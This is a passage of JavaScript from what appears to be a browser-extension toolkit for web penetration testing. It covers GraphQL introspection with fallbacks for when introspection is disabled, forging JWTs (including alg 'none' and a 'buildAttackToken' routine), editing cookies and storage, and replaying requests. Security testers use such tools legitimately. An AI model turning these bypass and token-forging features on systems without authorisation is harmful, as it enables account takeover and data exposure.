        <button class="recon-copy-btn gql-bypass-btn" data-bypass="formenc">Form-encoded</button>
        <button class="recon-copy-btn gql-bypass-btn" data-bypass="get">Switch to GET</button>
        <button class="recon-copy-btn gql-bypass-btn" data-bypass="typename">Probe __type only</button>
        <button class="recon-copy-btn gql-bypass-btn" data-bypass="suggest">Suggestion enum</button>
      </div>`;
  }

  function renderTypeProbe(typeData, url) {
    _currentUrl = url;
    const output = $('graphql-output');
    output.innerHTML = `
      <div class="graphql-header">
        <span class="graphql-endpoint-label">${esc(url)} <span class="dim">(partial — __type probe)</span></span>
        <button class="recon-copy-btn gql-dispatch-btn" data-action="gql-to-dispatch">&#8594; Dispatch</button>
      </div>
      ${section('Query Fields', typeData.fields?.length || 0, renderFields(typeData.fields || [], 'query'))}
    `;
    $('graphql-output').querySelectorAll('.graphql-section-header').forEach(h =>
      h.addEventListener('click', () => h.closest('.graphql-section')?.classList.toggle('collapsed'))
    );
  }

  async function introspect({ gqlOverride, bodyOverride, gql, body, rawBody, headers, nonIntrospection, statusLabel } = {}) {
    const url = $('graphql-url')?.value?.trim();
    if (!url) { toast('Enter endpoint URL first', 'error'); return; }
    const output = $('graphql-output');
    const gqlPayload = gqlOverride ?? gql;
    const bodyPayload = bodyOverride ?? body;
    const explicit = gqlPayload || bodyPayload || rawBody;
    const method = $('graphql-method')?.value || 'POST';
    const attempts = explicit
      ? [{ label: statusLabel || 'custom introspection', gql: gqlPayload, body: bodyPayload, rawBody, headers, method, nonIntrospection }]
      : [
          ...AUTO_INTROSPECTION_ATTEMPTS.map(a => ({ ...a, method })),
          ...(method === 'GET' ? [] : [{ label: 'GET query string', gql: INTROSPECTION_GQL, method: 'GET' }]),
        ];
    const errors = [];

    for (const [idx, attempt] of attempts.entries()) {
      output.innerHTML = `<div class="muted">${esc(statusLabel ?? `Running introspection (${idx + 1}/${attempts.length}): ${attempt.label}…`)}</div>`;
      const parsed = parseGraphQLResponse(await runIntrospectFetch(url, attempt.gql, attempt.body, attempt.method, attempt.headers, attempt.rawBody));
      if (parsed.error) { errors.push(`${attempt.label}: ${parsed.error}`); continue; }
      const data = parsed.data;
      if (attempt.nonIntrospection) {
        const suggestions = parseSuggestionNames(data.errors);
        renderSuggestionProbe(suggestions, url, data.errors || []);
        return;
      }
      const schema = schemaFromData(data);
      if (schema) {
        if (idx > 0 && !explicit) toast(`Introspection worked via ${attempt.label}`, 'success');
        renderSchema(schema, url);
        return;
      }
      const typeProbe = typeProbeFromData(data);
      if (typeProbe) {
        if (idx > 0 && !explicit) toast(`Partial introspection worked via ${attempt.label}`, 'success');
        renderTypeProbe(typeProbe, url);
        return;
      }
      const errMsg = inferGraphQLError(data);
      errors.push(`${attempt.label}: ${errMsg || 'No __schema in response'}`);
      if (explicit) break;
    }

    const errMsg = errors.join('\n');
    if (/introspection.*not allowed|__schema|__type|not allowed|disabled|Cannot query field/i.test(errMsg)) {
      const parsed = parseGraphQLResponse(await runIntrospectFetch(url, null, BYPASSES.suggest.body, method));
      if (parsed.data) {
        const suggestions = parseSuggestionNames(parsed.data.errors);
        if (suggestions.length) {
          toast('Introspection blocked; showing validation suggestions', 'warn');
          renderSuggestionProbe(suggestions, url, parsed.data.errors || []);
          return;
        }
      }
      showBypassOptions(output, errMsg);
    } else {
      output.innerHTML = `<div class="error-msg">GraphQL introspection failed:\n${esc(errMsg)}</div>`;
    }
  }

  function renderSchema(schema, url) {
    _currentUrl = url;
    const output = $('graphql-output');
    _types = schema.types.filter(t =>
      !t.name.startsWith('__') && !['String','Boolean','Int','Float','ID'].includes(t.name)
    );
    const userTypes = _types;
    const findType = name => userTypes.find(t => t.name === name);
    const queryT = findType(schema.queryType?.name);
    const mutT   = schema.mutationType ? findType(schema.mutationType.name) : null;
    const subT   = schema.subscriptionType ? findType(schema.subscriptionType.name) : null;
    const rootNames = new Set([schema.queryType?.name, schema.mutationType?.name, schema.subscriptionType?.name].filter(Boolean));
    const objectTypes = userTypes.filter(t => t.kind === 'OBJECT'    && !rootNames.has(t.name));
    const inputTypes  = userTypes.filter(t => t.kind === 'INPUT_OBJECT');
    const enumTypes   = userTypes.filter(t => t.kind === 'ENUM');
    const scalarTypes = userTypes.filter(t => t.kind === 'SCALAR');

    function typeListSection(title, types, bodyFn) {
      if (!types.length) return '';
      return section(title, types.length, types.map(t =>
        `<div class="graphql-type-entry" data-tname="${esc(t.name.toLowerCase())}"><div class="graphql-type-name">${esc(t.name)}</div>${bodyFn(t)}</div>`
      ).join(''));
    }

    output.innerHTML = `
      <div class="graphql-header">
        <span class="graphql-endpoint-label">${esc(url)}</span>
        <button id="graphql-copy-schema" class="recon-copy-btn">Copy JSON</button>
        <button id="graphql-copy-sdl" class="recon-copy-btn">Copy SDL</button>
        <button class="recon-copy-btn gql-dispatch-btn" data-action="gql-to-dispatch">&#8594; Dispatch</button>
      </div>
      ${queryT ? section('Queries', queryT.fields?.length || 0, renderFields(queryT.fields, 'query')) : ''}
      ${mutT   ? section('Mutations', mutT.fields?.length || 0, renderFields(mutT.fields, 'mutation'), ' graphql-mutations') : ''}
      ${subT   ? section('Subscriptions', subT.fields?.length || 0,
          renderFields(subT.fields) + '<div class="graphql-ws-note dim">WebSocket subscriptions cannot be tested via Dispatch</div>') : ''}
      ${typeListSection('Object Types', objectTypes, t => renderFields(t.fields))}
      ${typeListSection('Input Types', inputTypes, t => {
        if (!t.inputFields?.length) return '<div class="graphql-field dim">No fields</div>';
        return t.inputFields.map(f =>
          `<div class="graphql-field"><span class="graphql-fname">${esc(f.name)}</span><span class="graphql-ftype">${esc(typeStr(f.type))}</span></div>`
        ).join('');
      })}
      ${typeListSection('Enums', enumTypes, t =>
        `<div class="graphql-enum-values">${(t.enumValues||[]).map(v => `<span class="graphql-enum-val${v.isDeprecated?' deprecated':''}">${esc(v.name)}</span>`).join('')}</div>`
      )}
      ${scalarTypes.length ? section('Scalars', scalarTypes.length,
        `<div class="graphql-enum-values">${scalarTypes.map(t => `<span class="graphql-enum-val">${esc(t.name)}</span>`).join('')}</div>`
      ) : ''}
    `;

    $('graphql-copy-schema')?.addEventListener('click', () => {
      copyText(JSON.stringify(schema, null, 2));
      toast('Schema JSON copied', 'success');
    });
    $('graphql-copy-sdl')?.addEventListener('click', () => {
      copyText(schemaToSDL(schema));
      toast('SDL copied', 'success');
    });

    document.querySelectorAll('#graphql-output .graphql-section-header').forEach(h => {
      h.addEventListener('click', () => h.closest('.graphql-section')?.classList.toggle('collapsed'));
    });

    const searchBar = $('graphql-search-bar');
    if (searchBar) {
      searchBar.classList.remove('hidden');
      $('graphql-schema-search').value = '';
    }
    saveGqlUrlHistory(url);
  }

  function schemaToSDL(schema) {
    const BUILT_IN = new Set(['String', 'Boolean', 'Int', 'Float', 'ID']);
    const types = (schema.types || []).filter(t => !BUILT_IN.has(t.name) && !t.name.startsWith('__'));

    function typeRefSDL(t) {
      if (!t) return 'Unknown';
      if (t.kind === 'NON_NULL') return typeRefSDL(t.ofType) + '!';
      if (t.kind === 'LIST') return '[' + typeRefSDL(t.ofType) + ']';
      return t.name || 'Unknown';
    }

    function fieldSDL(f, indent = '  ') {
      const args = f.args?.length ? `(${f.args.map(a => `${a.name}: ${typeRefSDL(a.type)}`).join(', ')})` : '';
      const dep = f.isDeprecated ? ' @deprecated' : '';
      const desc = f.description ? `${indent}"""${f.description}"""\n` : '';
      return `${desc}${indent}${f.name}${args}: ${typeRefSDL(f.type)}${dep}`;
    }

    const parts = [];
    const qn = schema.queryType?.name, mn = schema.mutationType?.name, sn = schema.subscriptionType?.name;
    if ((qn && qn !== 'Query') || (mn && mn !== 'Mutation') || (sn && sn !== 'Subscription')) {
      let sd = 'schema {';
      if (qn) sd += `\n  query: ${qn}`;
      if (mn) sd += `\n  mutation: ${mn}`;
      if (sn) sd += `\n  subscription: ${sn}`;
      parts.push(sd + '\n}');
    }

    for (const t of types) {
      const desc = t.description ? `"""\n${t.description}\n"""\n` : '';
      let block = desc;
      switch (t.kind) {
        case 'SCALAR':
          block += `scalar ${t.name}`;
          break;
        case 'ENUM':
          block += `enum ${t.name} {\n`;
          block += (t.enumValues || []).map(v => `  ${v.name}${v.isDeprecated ? ' @deprecated' : ''}`).join('\n');
          block += '\n}';
          break;
        case 'INPUT_OBJECT':
          block += `input ${t.name} {\n`;
          block += (t.inputFields || []).map(f => `  ${f.name}: ${typeRefSDL(f.type)}`).join('\n');
          block += '\n}';
          break;
        case 'INTERFACE':
          block += `interface ${t.name} {\n${(t.fields || []).map(f => fieldSDL(f)).join('\n')}\n}`;
          break;
        case 'UNION':
          block += `union ${t.name} = ${(t.possibleTypes || []).map(p => p.name).join(' | ')}`;
          break;
        case 'OBJECT': {
          const impl = t.interfaces?.length ? ` implements ${t.interfaces.map(i => i.name).join(' & ')}` : '';
          block += `type ${t.name}${impl} {\n${(t.fields || []).map(f => fieldSDL(f)).join('\n')}\n}`;
          break;
        }
        default: block = '';
      }
      if (block) parts.push(block);
    }
    return parts.join('\n\n');
  }

  function applySchemaSearch(q) {
    const term = q.toLowerCase();
    document.querySelectorAll('#graphql-output .graphql-section').forEach(sec => {
      let sectionHit = false;
      sec.querySelectorAll(':scope > .graphql-section-body > .graphql-field').forEach(el => {
        const match = !term || (el.dataset.fname || '').includes(term);
        el.style.display = match ? '' : 'none';
        if (match) sectionHit = true;
      });
      sec.querySelectorAll('.graphql-type-entry').forEach(entry => {
        const typeMatch = !term || (entry.dataset.tname || '').includes(term);
        let fieldHit = false;
        entry.querySelectorAll('.graphql-field').forEach(el => {
          const match = !term || typeMatch || (el.dataset.fname || '').includes(term);
          el.style.display = match ? '' : 'none';
          if (!term || (el.dataset.fname || '').includes(term)) fieldHit = true;
        });
        entry.querySelectorAll('.graphql-enum-val').forEach(el => {
          const match = !term || typeMatch || el.textContent.toLowerCase().includes(term);
          el.style.display = match ? '' : 'none';
          if (match) fieldHit = true;
        });
        const entryVisible = !term || typeMatch || fieldHit;
        entry.style.display = entryVisible ? '' : 'none';
        if (entryVisible) sectionHit = true;
      });
      sec.style.display = sectionHit || !term ? '' : 'none';
    });
  }

  async function saveGqlUrlHistory(url) {
    if (!url) return;
    const { gqlUrlHistory = [] } = await chrome.storage.local.get('gqlUrlHistory');
    const updated = [url, ...gqlUrlHistory.filter(u => u !== url)].slice(0, 10);
    await chrome.storage.local.set({ gqlUrlHistory: updated });
    loadGqlUrlHistory();
  }

  function loadGqlUrlHistory() {
    chrome.storage.local.get('gqlUrlHistory', ({ gqlUrlHistory = [] }) => {
      const dl = $('graphql-url-history');
      if (dl) dl.innerHTML = gqlUrlHistory.map(u => `<option value="${esc(u)}">`).join('');
    });
  }

  function clear() {
    _endpoints = [];
    _endpointDetails = new Map();
    const out = $('graphql-output');
    const urlInput = $('graphql-url');
    const searchBar = $('graphql-search-bar');
    if (out) out.innerHTML = '<div class="muted" id="graphql-empty">Detect GraphQL endpoints from the current page, then run introspection to explore the schema.</div>';
    if (urlInput) urlInput.value = '';
    if (searchBar) { searchBar.classList.add('hidden'); $('graphql-schema-search').value = ''; }
  }

  return { detect, introspect, clear, sendToDispatch: (url, body) => sendToDispatch(url, body), getCurrentUrl: () => _currentUrl, getBypasses: () => BYPASSES, loadGqlUrlHistory, applySchemaSearch };
})();

// ─── Find bar ─────────────────────────────────────────────────────────────────

const FindBar = (() => {
  let _matches = [];
  let _current = -1;
  let _hlAll    = null;
  let _hlCur    = null;
  let _visible  = false;

  function init() {
    if (CSS?.highlights) {
      _hlAll = new Highlight();
      _hlCur = new Highlight();
      CSS.highlights.set('find-results', _hlAll);
      CSS.highlights.set('find-current', _hlCur);
    }

    document.addEventListener('keydown', e => {
      if ((e.metaKey || e.ctrlKey) && e.key === 'f') {
        e.preventDefault();
        show();
      } else if (e.key === 'Escape' && _visible) {
        e.preventDefault();
        hide();
      }
    });

    $('find-bar-input').addEventListener('input', () => search($('find-bar-input').value));
    $('find-bar-input').addEventListener('keydown', e => {
      if (e.key === 'Enter') { e.preventDefault(); e.shiftKey ? step(-1) : step(1); }
    });
    $('find-bar-next').addEventListener('click',  () => step(1));
    $('find-bar-prev').addEventListener('click',  () => step(-1));
    $('find-bar-close').addEventListener('click', () => hide());
  }

  function show() {
    $('find-bar').classList.remove('hidden');
    $('find-bar-input').focus();
    $('find-bar-input').select();
    _visible = true;
    search($('find-bar-input').value);
  }

  function hide() {
    $('find-bar').classList.add('hidden');
    _visible = false;
    clear();
  }

  function clear() {
    _matches = [];
    _current = -1;
    _hlAll?.clear();
    _hlCur?.clear();
    $('find-count').textContent = '';
    $('find-bar-input').classList.remove('find-no-results');
  }

  function search(q) {
    clear();
    if (!q) return;
    const scope = document.querySelector('.tab-pane.active') || document.body;
    const term  = q.toLowerCase();
    const walker = document.createTreeWalker(scope, NodeFilter.SHOW_TEXT, {
      acceptNode(node) {
        const p = node.parentElement;
        if (!p) return NodeFilter.FILTER_REJECT;
        if (['SCRIPT', 'STYLE', 'NOSCRIPT', 'TEXTAREA', 'INPUT'].includes(p.tagName))
          return NodeFilter.FILTER_REJECT;
        if (p.closest('.hidden, [style*="display: none"], [style*="display:none"]'))
          return NodeFilter.FILTER_REJECT;
        return NodeFilter.FILTER_ACCEPT;
      },
    });

    let node;
    while ((node = walker.nextNode())) {
      const text = node.textContent.toLowerCase();
      let idx = 0;
      while ((idx = text.indexOf(term, idx)) !== -1) {
        const r = new Range();
        r.setStart(node, idx);
        r.setEnd(node, idx + q.length);
        _matches.push(r);
        _hlAll?.add(r);
        idx += term.length;
      }
    }

    if (_matches.length) {
      _current = 0;
      updateCurrent();
    } else {
      $('find-bar-input').classList.add('find-no-results');
      updateCount();
    }
  }

  function step(dir) {
    if (!_matches.length) return;
    _current = (_current + dir + _matches.length) % _matches.length;
    updateCurrent();
  }

  function updateCurrent() {
    _hlCur?.clear();
    if (_current < 0 || !_matches[_current]) return;
    _hlCur?.add(_matches[_current]);
    _matches[_current].startContainer.parentElement
      ?.scrollIntoView({ block: 'nearest', behavior: 'smooth' });
    updateCount();
  }

  function updateCount() {
    $('find-count').textContent = _matches.length
      ? `${_current + 1} / ${_matches.length}`
      : ($('find-bar-input').value ? 'No results' : '');
  }

  return { init };
})();

// ─── Wire-up ──────────────────────────────────────────────────────────────────

document.addEventListener('DOMContentLoaded', async () => {
  initTabs();
  FindBar.init();

  // ── Cookies ──
  $('cookies-refresh').addEventListener('click', () => Cookies.load());
  $('cookies-add').addEventListener('click', () => Cookies.openEdit(null));
  $('cookies-clear').addEventListener('click', () => Cookies.clearAll());
  $('cookies-export').addEventListener('click', () => exportCookies());
  $('cookies-import-btn').addEventListener('click', () => $('cookies-import-input').click());
  $('cookies-import-input').addEventListener('change', e => {
    const f = e.target.files[0];
    if (f) importCookies(f).finally(() => { e.target.value = ''; });
  });
  $('cookies-filter').addEventListener('input', () => Cookies.render());
  $('ck-save').addEventListener('click', () => Cookies.save());
  $('ck-cancel').addEventListener('click', () => Cookies.closeModal());

  // Action buttons via data-action delegation
  $('cookies-body').addEventListener('click', e => {
    const btn = e.target.closest('[data-action]');
    if (!btn) return;
    const idx = +btn.dataset.idx;
    switch (btn.dataset.action) {
      case 'del':      Cookies.del(idx); break;
      case 'copy':     copyText(state.cookiesCache[idx].value); toast('Copied','success'); break;
      case 'send-jwt': Cookies.sendToJWT(idx); break;
      case 'edit':     Cookies.openEdit(idx); break;
    }
  });

  // Right-click JWT row → context menu
  $('cookies-body').addEventListener('contextmenu', e => {
    const row = e.target.closest('.st-entry[data-idx]');
    if (!row) { hideCtxMenu(); return; }
    e.preventDefault();
    const idx = +row.dataset.idx;
    const c = state.cookiesCache[idx];
    showCtxMenu(e.clientX, e.clientY, {
      kind: 'cookie',
      idx,
      canSendEncode: true,
      canSendJwt: !!c && isJWT(c.value),
    });
  });
  const storageContext = e => {
    const row = e.target.closest('.st-entry[data-type][data-key]');
    if (!row) { hideCtxMenu(); return; }
    e.preventDefault();
    showCtxMenu(e.clientX, e.clientY, {
      kind: 'storage',
      storageType: row.dataset.type,
      key: row.dataset.key,
      canSendEncode: true,
      canSendJwt: false,
    });
  };
  $('local-body').addEventListener('contextmenu', storageContext);
  $('session-body').addEventListener('contextmenu', storageContext);
  document.addEventListener('click', hideCtxMenu);
  $('ctx-send-jwt').addEventListener('click', () => {
    const src = state.ctxSource;
    if (src?.kind === 'cookie' && src.idx != null) Cookies.sendToJWT(src.idx);
  });
  $('ctx-send-encode').addEventListener('click', ctxSendToEncode);
  $('ctx-copy-urlencoded').addEventListener('click', () => {
    const value = getCtxValue();
    if (value == null) { toast('No value selected', 'error'); hideCtxMenu(); return; }
    copyText(encodeURIComponent(value));
    toast('Copied URL encoded', 'success');
    hideCtxMenu();
  });

  // ── Storage ──
  $('storage-refresh').addEventListener('click', () => {
    if (state.storageView === 'local') Storage.loadLocal(); else Storage.loadSession();
  });
  $('storage-add').addEventListener('click', () => Storage.openAdd(state.storageView));
  $('storage-clear-btn').addEventListener('click', () => Storage.clearAll(state.storageView));
  $('storage-switch-local').addEventListener('click', () => Storage.switchView('local'));
  $('storage-switch-session').addEventListener('click', () => Storage.switchView('session'));
  $('sk-save').addEventListener('click',   () => Storage.save());
  $('sk-cancel').addEventListener('click', () => Storage.closeModal());
  $('storage-filter').addEventListener('input', () => {
    const cache = state.storageView === 'local' ? state.localCache : state.sessionCache;
    Storage.renderTable(state.storageView, cache);
  });

  // Auto-load when switching to cookies tab
  document.querySelector('.nav-btn[data-tab="cookies"]').addEventListener('click', () => Cookies.load());

  // Re-populate JWT input from pinned cookie source when switching to JWT tab
  document.querySelector('.nav-btn[data-tab="jwt"]').addEventListener('click', () => {
    if (state.jwtSourceCookie !== null && !$('jwt-input').value.trim()) {
      const c = state.cookiesCache[state.jwtSourceCookie];
      if (c) { $('jwt-input').value = c.value; JWT.decode(); }
    }
  });

  // Auto-load when switching to storage tab
  document.querySelector('.nav-btn[data-tab="storage"]').addEventListener('click', async () => {
    await Storage.load();
    Storage.switchView(state.storageView);
  });

  const storageClick = e => {
    const target = e.target instanceof Element ? e.target : e.target?.parentElement;
    if (!target) return;

    const collapseBtn = target.closest('.collapse-btn');
    if (collapseBtn && collapseBtn.closest('.collapsible')) {
      const wrap = collapseBtn.closest('.collapsible');
      wrap.classList.toggle('collapsed');
      // icon handled by CSS ::after based on .collapsed class
      return;
    }

    const btn = target.closest('[data-action]');
    if (btn) {
      switch (btn.dataset.action) {
        case 'st-edit': Storage.openEdit(btn.dataset.st, btn.dataset.skey); break;
        case 'st-del':  Storage.del(btn.dataset.st, btn.dataset.skey); break;
        case 'st-copy': copyText(btn.dataset.val); toast('Copied','success'); break;
        case 'toggle-collapse': {
          const wrap = btn.closest('.collapsible');
          if (wrap) {
            wrap.classList.toggle('collapsed');
            const toggle = wrap.querySelector('.collapse-btn');
            // icon handled by CSS ::after based on .collapsed class
          }
          break;
        }
      }
      return;
    }
  };
  $('local-body').addEventListener('click',   storageClick);
  $('session-body').addEventListener('click', storageClick);

  // ── JWT ──
  $('jwt-decode-btn').addEventListener('click', () => {
    try {
      const { header, payload } = JWT.decode($('jwt-input').value);
      $('jwt-header').value  = JSON.stringify(header, null, 2);
      $('jwt-payload').value = JSON.stringify(payload, null, 2);
      $('jwt-sections').classList.remove('hidden');
    } catch (e) { toast(String(e), 'error'); }
  });

  $('jwt-clear-btn').addEventListener('click', () => {
    $('jwt-input').value = $('jwt-output').value = '';
    $('jwt-sections').classList.add('hidden');
  });

  $('jwt-alg').addEventListener('change', () => {
    const alg = $('jwt-alg').value.toLowerCase();
    $('jwt-secret-wrap').style.display = alg === 'none' ? 'none' : '';
    $('jwt-secret').placeholder = 'HMAC secret';
  });

  $('jwt-sign-btn').addEventListener('click', async () => {
    try {
      const header  = JSON.parse($('jwt-header').value);
      const payload = JSON.parse($('jwt-payload').value);
      const alg     = $('jwt-alg').value;
      let token;
      if (alg.toLowerCase() === 'none') {
        token = JWT.signNone(header, payload, alg);
      } else {
        const secret = $('jwt-secret').value;
        if (!secret) { toast('Secret / key required', 'error'); return; }
        token = await JWT.sign(header, payload, secret, alg);
      }
      $('jwt-output').value = token;
      toast('Token forged', 'success');
    } catch (e) { toast(String(e), 'error'); }
  });

  $('jwt-verify-btn').addEventListener('click', async () => {
    try {
      const token  = $('jwt-output').value || $('jwt-input').value;
      const secret = $('jwt-secret').value;
      if (!secret) { toast('Secret required for verify', 'error'); return; }
      const ok = await JWT.verifyHS256(token, secret);
      const el = $('jwt-verify-result');
      el.textContent = ok ? 'Signature valid' : 'Signature invalid';
      el.className = ok ? 'ok' : 'bad';
      el.classList.remove('hidden');
    } catch (e) { toast(String(e), 'error'); }
  });

  $('jwt-attack-apply').addEventListener('click', async () => {
    try {
      const header = JSON.parse($('jwt-header').value);
      const payload = JSON.parse($('jwt-payload').value);
      const token = await JWT.buildAttackToken($('jwt-attack-type').value, header, payload, {
        kid: $('jwt-attack-kid').value.trim(),
        material: $('jwt-attack-material').value,
        alg: $('jwt-alg').value,
      });
      $('jwt-output').value = token;
      const decoded = JWT.decode(token);
      $('jwt-header').value = JSON.stringify(decoded.header, null, 2);
      $('jwt-payload').value = JSON.stringify(decoded.payload, null, 2);
      toast('Attack token built', 'success');
    } catch (e) { toast(String(e), 'error'); }
  });

  $('jwt-copy-btn').addEventListener('click', () => {
    copyText($('jwt-output').value);
    toast('Copied', 'success');
  });

  $('jwt-use-btn').addEventListener('click', () => {
    $('jwt-input').value = $('jwt-output').value;
    toast('Loaded into input', 'info');
  });

  $('jwt-to-cookie-btn').addEventListener('click', jwtSendToCookie);

  // ── Recon ──
  initReconPlaceholders();
  $('recon-run-all').addEventListener('click', () => Recon.runAll());
  $('recon-copy-all').addEventListener('click', () => {
    const md = allReconToMarkdown();
    if (!md) { toast('Nothing to copy', 'warn'); return; }
    copyText(md);
    toast('All recon copied as Markdown', 'success');
  });
  $('recon-export-md').addEventListener('click', () => {
    const md = allReconToMarkdown();
    if (!md) { toast('Nothing to export', 'warn'); return; }
    downloadText(`spectre-recon-${Date.now()}.md`, md, 'text/markdown');
    toast('Recon Markdown exported', 'success');
  });
  $('recon-export-json').addEventListener('click', () => {
    const data = reconToJson();
    if (!data.sections.length) { toast('Nothing to export', 'warn'); return; }
    downloadText(`spectre-recon-${Date.now()}.json`, JSON.stringify(data, null, 2), 'application/json');
    toast('Recon JSON exported', 'success');
  });
  $('recon-collapse-all').addEventListener('click', () => {
    const sections = Array.from($$('#recon-output .recon-section'));
    const anyExpanded = sections.some(s => !s.classList.contains('recon-section-collapsed'));
    sections.forEach(s => s.classList.toggle('recon-section-collapsed', anyExpanded));
    $('recon-collapse-all').textContent = anyExpanded ? 'Expand All' : 'Collapse All';
  });
  $('recon-clear').addEventListener('click', () => {
    $('recon-output').innerHTML = '';
    $('recon-collapse-all').textContent = 'Collapse All';
    initReconPlaceholders();
  });
  $('recon-output').addEventListener('click', e => {
    const secretsCopy = e.target.closest('[data-action="secrets-copy"]');
    if (secretsCopy) {
      copyText(secretsCopy.dataset.val);
      toast('Copied', 'success');
      return;
    }

    const rerunBtn = e.target.closest('[data-action="recon-rerun"]');
    if (rerunBtn) {
      RECON_RERUN_MAP[rerunBtn.dataset.check]?.();
      return;
    }

    const spiderGroup = e.target.closest('[data-action="spider-group"]');
    if (spiderGroup) {
      Recon.spiderGroupBy = spiderGroup.dataset.group;
      if (Recon.spiderCache) Recon.renderSpiderFromCache();
      else Recon.links();
      return;
    }

    const spiderDetails = e.target.closest('[data-action="spider-toggle-details"]');
    if (spiderDetails) {
      const line = spiderDetails.closest('.recon-spider-line');
      const loc = line?.querySelector('.recon-spider-loc');
      if (!loc) return;
      const hidden = loc.classList.toggle('hidden');
      spiderDetails.textContent = hidden ? 'Details' : 'Hide';
      return;
    }

    const copyBtn = e.target.closest('[data-action="recon-copy"]');
    if (copyBtn) {
      const section = copyBtn.closest('.recon-section');
      if (section) {
        copyText(sectionToMarkdown(section));
        toast('Copied as Markdown', 'success');
      }
      return;
    }

    const spiderRepeat = e.target.closest('[data-action="spider-send-repeater"]');
    if (spiderRepeat) {
      $('dispatch-url').value = spiderRepeat.dataset.url;
      $('dispatch-method').value = 'GET';
      activateTab('dispatch');
      toast('URL sent to Dispatch', 'success');
      return;
    }

    const toggleBtn = e.target.closest('[data-action="recon-section-toggle"]');
    if (toggleBtn) {
      toggleBtn.closest('.recon-section')?.classList.toggle('recon-section-collapsed');
      const anyExp = Array.from($$('#recon-output .recon-section')).some(s => !s.classList.contains('recon-section-collapsed'));
      $('recon-collapse-all').textContent = anyExp ? 'Collapse All' : 'Expand All';
      return;
    }

    const scrollLink = e.target.closest('[data-scroll-to]');
    if (scrollLink) {
      const target = document.getElementById(scrollLink.dataset.scrollTo);
      if (target) {
        target.classList.remove('recon-section-collapsed');
        const anyExp = Array.from($$('#recon-output .recon-section')).some(s => !s.classList.contains('recon-section-collapsed'));
        $('recon-collapse-all').textContent = anyExp ? 'Collapse All' : 'Expand All';
        scrollContentToElement(target);
      }
      return;
    }

    const el = e.target.closest('[data-action="toggle-collapse"]');
    if (!el) return;
    const wrap = el.closest('.recon-spider-extra');
    if (!wrap) return;
    wrap.classList.toggle('collapsed');
    const btn = wrap.querySelector('.collapse-btn');
    // icon handled by CSS ::after based on .collapsed class
  });

  // ── Dispatch ──
  $('dispatch-load-current').addEventListener('click', () => Dispatch.loadCurrent());
  $('dispatch-send').addEventListener('click', () => Dispatch.send());
  $('dispatch-copy-curl').addEventListener('click', () => { copyText(Dispatch.buildCurl()); toast('curl copied', 'success'); });
  $('dispatch-clear').addEventListener('click', () => Dispatch.clear());
  $('dispatch-url').addEventListener('keydown', e => { if (e.key === 'Enter') Dispatch.send(); });
  $('tab-dispatch').addEventListener('click', e => {
    const tab = e.target.closest('.dispatch-tab-btn');
    if (!tab) return;
    $$('#tab-dispatch .dispatch-tab-btn').forEach(b => b.classList.remove('active'));
    tab.classList.add('active');
    $('dispatch-headers').classList.toggle('hidden', tab.dataset.pane !== 'headers');
    $('dispatch-body').classList.toggle('hidden', tab.dataset.pane !== 'body');
  });

  // ── Auth ──
  $('role-type').addEventListener('change', () => {
    const t = $('role-type').value;
    $('role-header-name').classList.toggle('hidden', t !== 'custom');
    $('role-cookie-name').classList.toggle('hidden', t !== 'cookie');
  });
  $('roles-list').addEventListener('click', e => {
    const btn = e.target.closest('[data-action]');
    if (!btn) return;
    switch (btn.dataset.action) {
      case 'edit-role':  Auth.startEdit(+btn.dataset.roleId); break;
      case 'apply-role': Auth.applyRole(+btn.dataset.roleId); break;
      case 'eject-role': Auth.ejectRole(); break;
      case 'del-role':   Auth.deleteRole(+btn.dataset.roleId); break;
    }
  });
  $('role-save-btn').addEventListener('click', () => Auth.saveRole());
  $('role-edit-cancel').addEventListener('click', () => Auth.cancelEdit());
  $('role-clear-btn').addEventListener('click', () => Auth.clearRoles());
  $('ua-apply-btn').addEventListener('click', () => UserAgent.apply());
  $('ua-reset-btn').addEventListener('click', () => UserAgent.reset());
  $('ua-save-btn').addEventListener('click', () => UserAgent.saveProfile());
  $('ua-profiles-list').addEventListener('click', e => {
    const btn = e.target.closest('[data-action]');
    if (!btn) return;
    const id = +btn.dataset.uaid;
    switch (btn.dataset.action) {
      case 'ua-apply': UserAgent.applyProfile(id); break;
      case 'ua-del':   UserAgent.deleteProfile(id); break;
    }
  });
  $('ua-preset').addEventListener('change', () => { $('ua-custom').value = ''; });
  UserAgent.loadSaved();
  UserAgent.loadProfiles();

  // ── Proxy ──
  $$('.proxy-quick').forEach(btn => btn.addEventListener('click', () => {
    Proxy.applyPreset(btn.dataset.mode);
  }));
  $('proxy-save-btn').addEventListener('click', () => Proxy.saveProfile());
  $('proxy-profiles-list').addEventListener('click', e => {
    const btn = e.target.closest('[data-action]');
    if (!btn) return;
    const id = +btn.dataset.pid;
    switch (btn.dataset.action) {
      case 'proxy-apply': Proxy.applyProfile(id); break;
      case 'proxy-del':   Proxy.deleteProfile(id); break;
    }
  });
  Proxy.loadSaved();

  // ── Profiles export / import ──
  $('profiles-export-btn').addEventListener('click', () => exportProfiles());
  $('profiles-import-btn').addEventListener('click', () => $('profiles-import-input').click());
  $('profiles-import-input').addEventListener('change', e => {
    const f = e.target.files[0];
    if (f) importProfiles(f).finally(() => { e.target.value = ''; });
  });

  // ── Header Profiles ──
  $('hprof-add-row').addEventListener('click', () => HeaderProfiles.addFormRow());
  $('hprof-save-btn').addEventListener('click', () => HeaderProfiles.saveProfile());
  $('hprof-eject-btn').addEventListener('click', () => HeaderProfiles.ejectProfile());
  $('hprof-list').addEventListener('click', e => {
    const btn = e.target.closest('[data-action]');
    if (!btn) return;
    const id = +btn.dataset.hpid;
    switch (btn.dataset.action) {
      case 'hprof-apply': HeaderProfiles.applyProfile(id); break;
      case 'hprof-del':   HeaderProfiles.deleteProfile(id); break;
    }
  });
  HeaderProfiles.loadProfiles();

  // ── Utils ──
  $('encode-btn').addEventListener('click', () => {
    $('encode-output').value = Encode.encode($('encode-type').value, $('encode-input').value);
  });
  $('decode-btn').addEventListener('click', () => {
    $('encode-output').value = Encode.decode($('encode-type').value, $('encode-input').value);
  });
  $('encode-swap-btn').addEventListener('click', () => {
    const tmp = $('encode-input').value;
    $('encode-input').value = $('encode-output').value;
    $('encode-output').value = tmp;
    $('encode-output').removeAttribute('readonly');
    setTimeout(() => $('encode-output').setAttribute('readonly',''), 0);
  });
  $('encode-copy').addEventListener('click', () => {
    copyText($('encode-output').value);
    toast('Copied', 'success');
  });
  $('encode-clear').addEventListener('click', () => {
    $('encode-input').value = $('encode-output').value = '';
  });

  // ── Timestamp ──
  $('ts-parse-btn').addEventListener('click', () => Timestamp.render(Timestamp.parse($('ts-input').value)));
  $('ts-now-btn').addEventListener('click', () => {
